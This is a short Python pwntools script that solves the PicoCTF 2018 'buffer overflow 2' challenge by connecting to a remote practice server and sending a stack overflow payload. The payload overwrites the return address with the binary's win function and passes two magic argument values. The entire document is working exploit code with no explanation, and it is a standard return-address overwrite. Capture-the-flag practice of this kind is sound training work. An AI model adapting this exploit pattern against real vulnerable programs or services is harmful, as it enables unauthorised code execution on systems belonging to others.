from pwn import *

proc_name = './PicoCTF_2018_buffer_overflow_2'

#p = process(proc_name)
p = remote('node4.buuoj.cn', 26353)
elf = ELF(proc_name)

win_addr = elf.sym['win']

a1 = 0x0DEADBEEF
a2 = 0x0DEADC0DE

payload = b'a' * ( 0x6c + 4 ) + p32(win_addr) + p32(0x123) + p32(a1) + p32(a2)

p.sendline(payload)

p.recvuntil('\n')
p.recvuntil('\n')
print(p.recv())
